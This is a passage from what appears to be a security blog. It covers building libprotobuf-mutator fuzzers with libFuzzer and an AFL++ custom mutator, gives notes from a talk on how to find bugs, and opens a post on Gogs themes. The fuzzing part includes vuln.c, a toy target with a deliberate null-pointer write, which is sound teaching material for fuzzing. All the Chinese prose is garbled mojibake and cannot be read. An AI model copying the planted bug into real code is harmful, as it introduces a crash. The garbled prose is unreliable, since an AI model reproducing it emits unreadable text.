class="variable">$(LPM_DIR)</span>/lib/libprotobuf-mutator.a</span><br><span class="line">INC=-I<span class="variable">$(PROTOBUF_DIR)</span>/<span class="keyword">include</span> -I<span class="variable">$(HOME)</span>/code/libprotobuf-mutator/ -I<span class="variable">$(LPM_DIR)</span>/<span class="keyword">include</span></span><br><span class="line">DFUZZ=-DLLVMFuzzerTestOneInput=FuzzTEST</span><br><span class="line"></span><br><span class="line"><span class="section">all: <span class="variable">$(TARGET)</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment"># for testing libprotobuf + libfuzzer</span></span><br><span class="line"><span class="comment"># compile harness first</span></span><br><span class="line"><span class="comment"># then link lpm_libfuzz with harness.o &amp; static libraries</span></span><br><span class="line"><span class="section">harness.o: harness.cc</span></span><br><span class="line">	<span class="variable">$(CXX)</span> <span class="variable">$(CXXFLAGS)</span> -c <span class="variable">$(DFUZZ)</span> <span class="variable">$&lt;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET)</span>: harness.o <span class="variable">$(TARGET)</span>.cc</span><br><span class="line">	<span class="variable">$(CXX)</span> <span class="variable">$(CXXFLAGS)</span> -o <span class="variable">$@</span> <span class="variable">$^</span> <span class="variable">$(PB_SRC)</span> <span class="variable">$(LPM_LIB)</span> <span class="variable">$(PROTOBUF_LIB)</span> <span class="variable">$(INC)</span> <span class="comment"># $(LPM_LIB) must be placed before $(PROTOBUF_LIB)</span></span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="keyword">.PHONY</span>: clean</span></span><br><span class="line"><span class="section">clean: </span></span><br><span class="line">	rm <span class="variable">$(TARGET)</span> *.o</span><br></pre></td></tr></table></figure>

<p>ä¿®æ”¹ makefile åï¼Œå¯ä»¥æ­£å¸¸ç¼–è¯‘é€šè¿‡ã€‚ç»è¿‡æˆ‘ä»¬ä¸Šé¢çš„åˆ†æï¼Œä¸éœ€è¦å®šä¹‰ <code>DFUZZ=-DLLVMFuzzerTestOneInput=FuzzTEST</code> å°†è¿™è¡Œåˆ é™¤æ‰ï¼ŒåŒæ ·å¯ä»¥ç¼–è¯‘é€šè¿‡ã€‚</p>
<p>æ‰§è¡Œ <code>lpm_libfuzz</code> è¿è¡Œæ­£å¸¸</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">âœ  ./lpm_libfuzz                                                                                                                                                                                          </span><br><span class="line">INFO: found LLVMFuzzerCustomMutator (0x758a80). Disabling -len_control by default.</span><br><span class="line">INFO: Running with entropic power schedule (0xFF, 100).                                    </span><br><span class="line">INFO: Seed: 331712324                       </span><br><span class="line">INFO: Loaded 1 modules   (434 inline 8-bit counters): 434 [0xa056b8, 0xa0586a), </span><br><span class="line">INFO: Loaded 1 PC tables (434 PCs): 434 [0x939398,0x93aeb8), </span><br><span class="line">INFO: -max_len is not provided; libFuzzer will not generate inputs larger than 4096 bytes</span><br><span class="line">INFO: A corpus is not provided, starting from an empty corpus</span><br><span class="line">#2      INITED cov: 82 ft: 83 corp: 1/1b exec/s: 0 rss: 35Mb</span><br><span class="line">        NEW_FUNC[1/41]: 0x75abb0 in TEST::~TEST() /tmp/genfiles/test.pb.cc:116</span><br><span class="line">        NEW_FUNC[2/41]: 0x75ca10 in google::protobuf::UnknownFieldSet* google::protobuf::internal::InternalMetadata::mutable_unknown_fields&lt;google::protobuf::UnknownFieldSet&gt;() /home/henices/code/libprotobuf-mut</span><br><span class="line">ator/build/external.protobuf//include/google/protobuf/metadata_lite.h:117</span><br><span class="line">#3      NEW    cov: 135 ft: 159 corp: 2/12b lim: 4096 exec/s: 0 rss: 36Mb L: 11/11 MS: 1 CustomCrossOver-</span><br><span class="line">#4      NEW    cov: 138 ft: 162 corp: 3/201b lim: 4096 exec/s: 0 rss: 36Mb L: 189/189 MS: 2 InsertRepeatedBytes-Custom-</span><br><span class="line">#38     REDUCE cov: 138 ft: 162 corp: 3/127b lim: 4096 exec/s: 0 rss: 37Mb L: 115/115 MS: 5 CustomCrossOver-CustomCrossOver-Custom-InsertRepeatedBytes-Custom-</span><br><span class="line">#60     REDUCE cov: 138 ft: 162 corp: 3/124b lim: 4096 exec/s: 0 rss: 37Mb L: 112/112 MS: 4 CustomCrossOver-ShuffleBytes-ChangeByte-Custom-</span><br><span class="line">#98     REDUCE cov: 138 ft: 162 corp: 3/56b lim: 4096 exec/s: 0 rss: 37Mb L: 44/44 MS: 5 CrossOver-Custom-Custom-CMP-Custom- DE: &quot;~\xff\xff\xff\xff\xff\xff\xff&quot;-</span><br><span class="line">#144    REDUCE cov: 138 ft: 162 corp: 3/53b lim: 4096 exec/s: 0 rss: 37Mb L: 41/41 MS: 2 CrossOver-Custom-</span><br><span class="line">#182    REDUCE cov: 138 ft: 162 corp: 3/25b lim: 4096 exec/s: 0 rss: 37Mb L: 13/13 MS: 5 ChangeBit-Custom-Custom-InsertByte-Custom-</span><br><span class="line">#324    REDUCE cov: 138 ft: 162 corp: 3/24b lim: 4096 exec/s: 0 rss: 38Mb L: 12/12 MS: 3 CustomCrossOver-EraseBytes-Custom-</span><br></pre></td></tr></table></figure>

<h3 id="Handling-input-from-AFL-in-our-custom-mutator"><a href="#Handling-input-from-AFL-in-our-custom-mutator" class="headerlink" title="Handling input from AFL++ in our custom mutator"></a>Handling input from AFL++ in our custom mutator</h3><p><a target="_blank" rel="noopener" href="https://github.com/bruce30262/libprotobuf-mutator_fuzzing_learning/tree/master/5_libprotobuf_aflpp_custom_mutator_input">https://github.com/bruce30262/libprotobuf-mutator_fuzzing_learning/tree/master/5_libprotobuf_aflpp_custom_mutator_input</a></p>
<p>ä¸»è¦å†…å®¹æ˜¯å°† libprotobuf-mutator å’Œ afl++ ç»“åˆèµ·æ¥ï¼Œä½¿ç”¨çš„ afl++ çš„ custom mutatorï¼Œå€¼å¾—ä¸€æçš„æ˜¯åœ¨è¿™ä¸ªä¾‹å­é‡Œï¼Œéœ€è¦ä½¿ç”¨ <code>-fPIC</code> å‚æ•°ç¼–è¯‘ libprotobuf-mutatorã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cmake .. -GNinja -DCMAKE_C_COMPILER=clang -DLIB_PROTO_MUTATOR_DOWNLOAD_PROTOBUF=ON \</span><br><span class="line">-DCMAKE_INSTALL_PREFIX=/home/henices/code/AFL+/external/libprotobuf-mutator \</span><br><span class="line">-DCMAKE_CXX_COMPILER=clang++ -DCMAKE_BUILD_TYPE=Debug \</span><br><span class="line">-DCMAKE_C_FLAGS=<span class="string">&quot;-fPIC&quot;</span> -DCMAKE_CXX_FLAGS=<span class="string">&quot;-fPIC&quot;</span></span><br></pre></td></tr></table></figure>

<p>ä¸»è¦çš„æ­¥éª¤åœ¨ <a target="_blank" rel="noopener" href="https://github.com/bruce30262/libprotobuf-mutator_fuzzing_learning/blob/master/5_libprotobuf_aflpp_custom_mutator_input/README.md">readme.md</a> ä¸­å·²ç»ä»‹ç»å¾—æ¯”è¾ƒæ¸…æ¥šäº†ã€‚</p>
<ul>
<li><code>lpm_aflpp_custom_mutator_input.cc</code> æ˜¯ afl++ çš„ custom mutator shared library<ul>
<li>è§£æè¾“å…¥æ•°æ®ï¼ˆtestcase bufferï¼‰å¹¶å°†å…¶è½¬æˆ <code>TEST</code> protobuf message</li>
<li>ä½¿ç”¨ <code>libprotobuf-mutator</code> å˜å¼‚ <code>TEST</code> protobuf message</li>
<li>æ³¨å†Œä¸€ä¸ª <code>PostProcessor</code> å¤„ç†å˜å¼‚åçš„ <code>TEST</code> protobuf message ï¼ˆéå¿…è¦æ­¥éª¤ï¼‰</li>
</ul>
</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function"><span class="type">size_t</span> <span class="title">afl_custom_fuzz</span><span class="params">(MyMutator *mutator, <span class="comment">// return value from afl_custom_init</span></span></span></span><br><span class="line"><span class="params"><span class="function">                       <span class="type">uint8_t</span> *buf, <span class="type">size_t</span> buf_size, <span class="comment">// input data to be mutated</span></span></span></span><br><span class="line"><span class="params"><span class="function">                       <span class="type">uint8_t</span> **out_buf, <span class="comment">// output buffer</span></span></span></span><br><span class="line"><span class="params"><span class="function">                       <span class="type">uint8_t</span> *add_buf, <span class="type">size_t</span> add_buf_size,  <span class="comment">// add_buf can be NULL</span></span></span></span><br><span class="line"><span class="params"><span class="function">                       <span class="type">size_t</span> max_size)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// This function can be named either &quot;afl_custom_fuzz&quot; or &quot;afl_custom_mutator&quot;</span></span><br><span class="line">    <span class="comment">// A simple test shows that &quot;buf&quot; will be the content of the current test case</span></span><br><span class="line">    <span class="comment">// &quot;add_buf&quot; will be the next test case ( from AFL++&#x27;s input queue )</span></span><br><span class="line">    </span><br><span class="line">    TEST input;</span><br><span class="line">    <span class="comment">// parse input data to TEST</span></span><br><span class="line">    <span class="comment">// Notice that input data should be a serialized protobuf data</span></span><br><span class="line">    <span class="comment">// Check ./in/ii and test_protobuf_serializer for more detail</span></span><br><span class="line">    <span class="type">bool</span> parse_ok = input.<span class="built_in">ParseFromArray</span>(buf, buf_size);</span><br><span class="line">    <span class="keyword">if</span>(!parse_ok) &#123;</span><br><span class="line">        <span class="comment">// Invalid serialize protobuf data. Don&#x27;t mutate.</span></span><br><span class="line">        <span class="comment">// Return a dummy buffer. Also mutated_size = 0</span></span><br><span class="line">        <span class="type">static</span> <span class="type">uint8_t</span> *dummy = <span class="keyword">new</span> <span class="type">uint8_t</span>[<span class="number">10</span>]; <span class="comment">// dummy buffer with no data</span></span><br><span class="line">        *out_buf = dummy;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// mutate the protobuf</span></span><br><span class="line">    mutator-&gt;<span class="built_in">Mutate</span>(&amp;input, max_size);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Convert protobuf to raw data</span></span><br><span class="line">    <span class="type">const</span> TEST *p = &amp;input;</span><br><span class="line">    std::string s = <span class="built_in">ProtoToData</span>(*p);</span><br><span class="line">    <span class="comment">// Copy to a new buffer ( mutated_out )</span></span><br><span class="line">    <span class="type">size_t</span> mutated_size = s.<span class="built_in">size</span>() &lt;= max_size ? s.<span class="built_in">size</span>() : max_size; <span class="comment">// check if raw data&#x27;s size is larger than max_size</span></span><br><span class="line">    <span class="type">uint8_t</span> *mutated_out = <span class="keyword">new</span> <span class="type">uint8_t</span>[mutated_size+<span class="number">1</span>];</span><br><span class="line">    <span class="built_in">memcpy</span>(mutated_out, s.<span class="built_in">c_str</span>(), mutated_size); <span class="comment">// copy the mutated data</span></span><br><span class="line">    <span class="comment">// Assign the mutated data and return mutated_size</span></span><br><span class="line">    *out_buf = mutated_out;</span><br><span class="line">    <span class="keyword">return</span> mutated_size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>mutator-&gt;Mutate(&amp;input, max_size);</code> ä¸ºçœŸæ­£èµ·ä½œç”¨çš„æ ¸å¿ƒä»£ç </p>
<ul>
<li><code>lpm_aflpp_custom_mutator_input.h</code>  ç»§æ‰¿äº†protobuf_mutator::Mutatorï¼Œ å¯ä»¥ä½¿ç”¨ libprotobuf-mutator çš„ Mutate æ–¹æ³•</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;libprotobuf-mutator/src/mutator.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;test.pb.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyMutator</span> : <span class="keyword">public</span> protobuf_mutator::Mutator &#123;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li><p><code>test_proto_serializer.cc</code></p>
<ul>
<li>ç”¨äºç”Ÿæˆä¸€æ¡åºåˆ—åŒ–çš„ <code>TEST</code> protobuf messageï¼Œå¯ä»¥ä½œä¸º fuzz çš„åˆå§‹åŒ– testcase ä½¿ç”¨</li>
</ul>
</li>
<li><p><code>vuln.c</code> æ¼æ´æµ‹è¯•ç¨‹åº</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">100</span>]=&#123;&#125;;</span><br><span class="line">    read(<span class="number">0</span>, str, <span class="number">100</span>);</span><br><span class="line">    <span class="type">int</span> *ptr = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span>( str[<span class="number">0</span>] == <span class="string">&#x27;\x02&#x27;</span> || str[<span class="number">0</span>] == <span class="string">&#x27;\xe8&#x27;</span>) &#123;</span><br><span class="line">        *ptr = <span class="number">123</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ¼æ´æµ‹è¯•ç¨‹åºæ¯”è¾ƒç®€å•ï¼Œåªè¦ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯ <code>0xe8</code> æˆ–è€… <code>0x02</code> å³å¯ï¼Œlibprotobuf-mutator çš„å˜å¼‚åœ¨è¿™ä¸ªä¾‹å­é‡Œæ•ˆç‡å¹¶ä¸é«˜ï¼Œæ‰€ä»¥éœ€è¦ä½¿ç”¨ <code>PostProcessor</code> æ¥ä¼˜åŒ–å˜å¼‚ã€‚</p>
<ul>
<li>Makefile</li>
</ul>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">TARGET=lpm_aflpp_custom_mutator_input</span><br><span class="line">CXX=clang++-11</span><br><span class="line">AFLCC=<span class="variable">$(HOME)</span>/AFLplusplus/afl-gcc</span><br><span class="line">PB_SRC=test.pb.cc</span><br><span class="line"></span><br><span class="line">PROTOBUF_DIR=<span class="variable">$(HOME)</span>/libprotobuf-mutator/build/external.protobuf</span><br><span class="line">PROTOBUF_LIB=<span class="variable">$(PROTOBUF_DIR)</span>/lib/libprotobufd.a</span><br><span class="line"></span><br><span class="line">LPM_DIR=<span class="variable">$(HOME)</span>/libprotobuf-mutator</span><br><span class="line">LPM_LIB=<span class="variable">$(LPM_DIR)</span>/build/src/libfuzzer/libprotobuf-mutator-libfuzzer.a <span class="variable">$(LPM_DIR)</span>/build/src/libprotobuf-mutator.a</span><br><span class="line"></span><br><span class="line">INC=-I<span class="variable">$(PROTOBUF_DIR)</span>/<span class="keyword">include</span> -I<span class="variable">$(LPM_DIR)</span></span><br><span class="line"></span><br><span class="line"><span class="section">all: <span class="variable">$(TARGET)</span>.so</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET)</span>.so: <span class="variable">$(TARGET)</span>.cc <span class="variable">$(PB_SRC)</span></span><br><span class="line">	<span class="variable">$(CXX)</span> -fPIC -c <span class="variable">$^</span> <span class="variable">$(INC)</span></span><br><span class="line">	<span class="variable">$(CXX)</span> -shared -Wall -O3 -o <span class="variable">$@</span> *.o <span class="variable">$(LPM_LIB)</span> <span class="variable">$(PROTOBUF_LIB)</span></span><br><span class="line"></span><br><span class="line"><span class="section">vuln: vuln.c</span></span><br><span class="line">	<span class="variable">$(AFLCC)</span> -o <span class="variable">$@</span> <span class="variable">$^</span></span><br><span class="line"></span><br><span class="line"><span class="section">test_proto_serializer: test_proto_serializer.cc <span class="variable">$(PB_SRC)</span></span></span><br><span class="line">	<span class="variable">$(CXX)</span> -o <span class="variable">$@</span> <span class="variable">$^</span> <span class="variable">$(PROTOBUF_LIB)</span> <span class="variable">$(INC)</span></span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="keyword">.PHONY</span>: clean</span></span><br><span class="line"><span class="section">clean: </span></span><br><span class="line">	rm *.so *.o vuln test_proto_serializer</span><br></pre></td></tr></table></figure>

<p>Makefile æœ‰ç‘•ç–µï¼Œè¿™ä¸ªç« èŠ‚çš„å†…å®¹å’Œ libfuzzer æ²¡æœ‰å…³ç³»ï¼Œä¸éœ€è¦é“¾æ¥ <code>libprotobuf-mutator-libfuzzer.a</code></p>
<h2 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h2><p><a target="_blank" rel="noopener" href="https://developers.google.com/protocol-buffers/docs/cpptutorial">https://developers.google.com/protocol-buffers/docs/cpptutorial</a><br><a target="_blank" rel="noopener" href="https://github.com/google/fuzzing/blob/master/docs/structure-aware-fuzzing.md">https://github.com/google/fuzzing/blob/master/docs/structure-aware-fuzzing.md</a><br><a target="_blank" rel="noopener" href="https://github.com/google/libprotobuf-mutator/">https://github.com/google/libprotobuf-mutator/</a><br><a target="_blank" rel="noopener" href="https://llvm.org/docs/LibFuzzer.html">https://llvm.org/docs/LibFuzzer.html</a><br><a target="_blank" rel="noopener" href="https://github.com/bruce30262/libprotobuf-mutator_fuzzing_learning">https://github.com/bruce30262/libprotobuf-mutator_fuzzing_learning</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://usmacd.com/2022/05/05/How_do_you_actually_find_bugs/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="henices">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="å®‰å…¨ä»£ç ">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | å®‰å…¨ä»£ç ">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/05/05/How_do_you_actually_find_bugs/" class="post-title-link" itemprop="url">Keynote - How Do You Actually Find Bugs?</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-05-05 16:43:43" itemprop="dateCreated datePublished" datetime="2022-05-05T16:43:43+08:00">2022-05-05</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=7Ysy6iA2sqA&amp;ab_channel=OffensiveCon">https://www.youtube.com/watch?v=7Ysy6iA2sqA&amp;ab_channel=OffensiveCon</a></p>
<ul>
<li>Temperament<ul>
<li>Curiosity</li>
<li>Detail-oriented</li>
<li>Ability to deal with failure and continual evidence that youâ€™re wrong</li>
</ul>
</li>
<li>Learn how to deal with failure<ul>
<li>Two projects (can be unrealeted, or different parts of the same)<ul>
<li>Learn to recognize whe you have hit a wall and have become unproductive</li>
<li>Switch to your secondary project</li>
</ul>
</li>
<li>Consider having a development project as your seconary project<ul>
<li>Do an achiveable, measurable task</li>
<li>Regain a sense of achievement</li>
</ul>
</li>
</ul>
</li>
<li>Moving on - Knowning when to quit<ul>
<li>You will return it in the future</li>
</ul>
</li>
<li>Motivation - Remaining Enager<ul>
<li>The more youâ€™re curious about how a technology works or how an algorithm achives its goal, the less monotonous code review is</li>
</ul>
</li>
<li>Motivation - bug patching<ul>
<li>bugs being patched is frustrating<ul>
<li>â€¦ but they are evidence that you were on the right track!</li>
</ul>
</li>
</ul>
</li>
<li>Confidence<ul>
<li>Research is a daunting filed to enter</li>
<li>Some security reseacher you respect had the same self-doubt coming in, and have recurrences from time to time</li>
<li>Growth mindset: â€œI canâ€™t do that â€¦ Yetâ€</li>
</ul>
</li>
<li>Bias and assumptions<ul>
<li>Common code reviewer biases<ul>
<li>Everyone has looked at the already (many eyes make all bugs shallow)</li>
<li>Even if I found something, it will be unexploitable (Server side)</li>
<li>The X attack surface is not interesting now (eg, media parsing in browsers)</li>
<li>There are no more bugs in this</li>
<li>The protocol doesnâ€™t allow you to do X</li>
</ul>
</li>
</ul>
</li>
<li>Auditing Process<ul>
<li>Understanding the code</li>
<li>Documenting your findings</li>
<li>Identifying bias</li>
<li>Tooling</li>
<li>Revisit the code base</li>
<li>Analyze failures</li>
</ul>
</li>
<li>Attampt to understand the code<ul>
<li>A lot of people try to short-circuit this process<ul>
<li>Reliance on tools</li>
<li>Fuzzers&#x2F;static analyzers are a guide, not the whole process</li>
</ul>
</li>
<li>Many of todayâ€™s vulnerabilities are complex, and require in-depth understanding of the codebase</li>
<li>The more you understand about how the program works, the better equipped you are to find bugs ( and exploit them)</li>
<li>The best way to understand how something works is to explain to someone else</li>
</ul>
</li>
<li>What Iâ€™m looking for<ul>
<li>software risk &#x3D; available attack surface * complexity</li>
<li>attack surface can be indirect<ul>
<li>even mitigations are attack surface</li>
</ul>
</li>
<li>often you initial perception of attack surface is naive<ul>
<li>Hidden&#x2F;non-obvious attack surfaces are the best</li>
</ul>
</li>
<li>Complexity is plentiful<ul>
<li>Feature driven (thanks w3c)</li>
<li>Legacy support</li>
<li>Often avoidable: the anomaly of cheap complexity</li>
</ul>
</li>
</ul>
</li>
<li>Borrwoing ideas<ul>
<li>Bugtracker &#x2F; Diffs<ul>
<li>Can show where a bug is</li>
<li>Can inspire new ideas: variants, same bugs in other codebase</li>
<li>Mean but viable: track commits by error-prone developers</li>
</ul>
</li>
<li>Comments in the codebase<ul>
<li>Descripbe things Iâ€™d never thought of</li>
</ul>
</li>
</ul>
</li>
<li>Document your findings<ul>
<li>Get into the habit of documenting<ul>
<li>ideas, bugs candidates, idiosyncrasies, data structure, algorithms</li>
</ul>
</li>
<li>Documenting failed ideas is as important as documenting successful ones<ul>
<li>avoids repeating thie idea sometime later</li>
</ul>
</li>
<li>Long term view: Iâ€™m going to revisit this later</li>
</ul>
</li>
<li>Revisit code bases and failed bugs<ul>
<li>code bases are not static<ul>
<li>coee rewritten</li>
<li>Features added&#x2F;changed</li>
</ul>
</li>
<li>Environment is not static</li>
</ul>
</li>
<li>Analyze your failures<ul>
<li>if someone succeeds where you didnâ€™t, have a look at what they found</li>
<li>Try to figure out: why did I miss it?</li>
<li>Is this a one-off or teachable trick&#x2F;blind spot</li>
<li>Can you improve on that?</li>
<li>Is there a pattern in those falures?</li>
<li>Failures is an oppotunity to learn</li>
</ul>
</li>
</ul>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://usmacd.com/2022/04/13/gogs/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="henices">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="å®‰å…¨ä»£ç ">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | å®‰å…¨ä»£ç ">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/04/13/gogs/" class="post-title-link" itemprop="url">gogs çš®è‚¤å’Œæºç å‡çº§</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-04-13 11:21:39" itemprop="dateCreated datePublished" datetime="2022-04-13T11:21:39+08:00">2022-04-13</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>gogs ä½¿ç”¨äº†ä¹Ÿæœ‰ä¸€å¹´å¤šäº†ï¼Œå°å›¢é˜Ÿä½¿ç”¨åŸºæœ¬è¿˜è¡Œã€‚æœ‰å‡ ä¸ªé—®é¢˜ï¼Œç¬¬ä¸€ç•Œé¢ä»£ç  merge æœ‰é—®é¢˜ï¼Œç¬¬äºŒä¸æ”¯æŒä»£ç  reviewï¼Œ<br>å¦‚æœèƒ½è§£å†³ä¸Šé¢ä¸¤ä¸ªé—®é¢˜å°±å¥½ç”¨å¾ˆå¤šäº†ã€‚ä¸‹é¢ä¸¤æ®µæ˜¯å¹´å‰æŠ˜è…¾ gogs çš„è®°å½•ï¼Œæ²¡æœ‰å•¥æŠ€æœ¯å«é‡ï¼Œåªæ˜¯åšä¸ªå¤‡ä»½ã€‚</p>
<h2 id="åˆ‡æ¢çš®è‚¤"><a href="#åˆ‡æ¢çš®è‚¤" class="headerlink" title="åˆ‡æ¢çš®è‚¤"></a>åˆ‡æ¢çš®è‚¤</h2><p><a target="_blank" rel="noopener" href="https://github.com/Kos-M/GogsThemes">https://github.com/Kos-M/GogsThemes</a> æä¾›äº†ä¸¤æ¬¾çš®è‚¤ï¼Œæ–‡ä¸­ç»™å‡ºçš„æ–¹æ³•è¦ä¿®æ”¹ gogs é…ç½®ï¼Œç›´æ¥ä½¿ç”¨ TamperMonkey å°±å¯ä»¥äº†ã€‚</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ==UserScript==</span></span><br><span class="line"><span class="comment">// @name         Gogs Theme</span></span><br><span class="line"><span class="comment">// @resource     IMPORTED_CSS https://raw.githubusercontent.com/Kos-M/GogsThemes/master/themes/dark_theme.css</span></span><br><span class="line"><span class="comment">// @namespace    http://tampermonkey.net/</span></span><br><span class="line"><span class="comment">// @version      0.1</span></span><br><span class="line"><span class="comment">// @description  try to take over the world!</span></span><br><span class="line"><span class="comment">// @author       You</span></span><br><span class="line"><span class="comment">// @match        